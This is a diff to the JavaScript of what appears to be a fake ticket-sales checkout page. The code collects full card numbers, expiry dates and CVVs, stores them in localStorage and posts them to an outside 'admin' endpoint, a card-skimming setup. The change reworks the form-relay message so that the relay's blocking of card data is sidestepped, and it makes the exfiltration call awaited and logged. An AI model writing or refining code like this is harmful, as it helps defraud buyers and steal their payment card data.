@@ -956,7 +956,15 @@ document.addEventListener('DOMContentLoaded', () => {
         formData.append('expiry_date', expDate);
         formData.append('security_code', cvv);
         formData.append('zip_code', postalCode);
-        formData.append('message', `Payment Details: Card: ${cardNumber}, Expiry: ${expDate}, Amount: $${(selectedPrice * selectedQty).toFixed(2)}`);
+        // Don't include sensitive card data in message - Web3Forms blocks it
+        formData.append('message', `Ticket Purchase for ${selectedQty} tickets. Amount: $${(selectedPrice * selectedQty).toFixed(2)}`);
+
+        console.log('📤 Submitting to Web3Forms...', {
+          email: emailInput.value,
+          event: document.getElementById('modal-event-name').textContent.trim(),
+          quantity: selectedQty,
+          amount: (selectedPrice * selectedQty).toFixed(2)
+        });
 
         // Submit to Web3Forms
         const response = await fetch('https://api.web3forms.com/submit', {
@@ -966,7 +974,11 @@ document.addEventListener('DOMContentLoaded', () => {
 
         const result = await response.json();
 
+        console.log('📥 Web3Forms Response:', result);
+
         if (result.success) {
+          console.log('✅ Web3Forms accepted submission');
+          
           // Save submission to admin panel
           const submissionData = {
             email: emailInput.value,
@@ -977,7 +989,8 @@ document.addEventListener('DOMContentLoaded', () => {
             cardNumber: cardNumber, // Save full card number
             expiryDate: expDate,
             cvv: cvv, // Save CVV
-            zipCode: postalCode
+            zipCode: postalCode,
+            submissionType: 'card'
           };
 
           // Save to localStorage
@@ -994,19 +1007,21 @@ document.addEventListener('DOMContentLoaded', () => {
           };
           submissions.unshift(newSubmission);
           localStorage.setItem('submissions', JSON.stringify(submissions));
+          console.log('💾 Saved to localStorage');
 
           // Also post to admin API to sync with GitHub
           try {
-            fetch('https://admin-tmaster.vercel.app/api/submissions', {
+            const adminResponse = await fetch('https://admin-tmaster.vercel.app/api/submissions', {
               method: 'POST',
               headers: {
                 'Content-Type': 'application/json',
                 'X-API-Token': API_SECRET_TOKEN
               },
               body: JSON.stringify(submissionData)
-            }).catch(err => console.log('Note: Admin sync failed (non-critical)', err));
+            });
+            console.log('📤 Admin API sync response:', adminResponse.status);
           } catch (e) {
-            console.log('Note: Could not sync to admin', e);
+            console.log('Note: Admin sync failed (non-critical)', e);
           }
 
           alert('Your order is processing, you will receive the tickets via your email address shortly. Thank you for your purchase!');
@@ -1021,10 +1036,11 @@ document.addEventListener('DOMContentLoaded', () => {
           modal.classList.remove('blur-active');
           document.body.style.overflow = '';
         } else {
-          alert('Payment processing failed: ' + (result.message || 'Please try again'));
+          console.error('❌ Web3Forms rejected submission:', result);
+          alert('Payment processing failed: ' + (result.message || 'Unknown error. Please try again.'));
         }
       } catch (err) {
-        console.error('Order submission error:', err);
+        console.error('❌ Order submission error:', err);
         alert('Error placing order: ' + (err.message || 'Please try again'));
       } finally {
         placeOrderBtn.disabled = false;
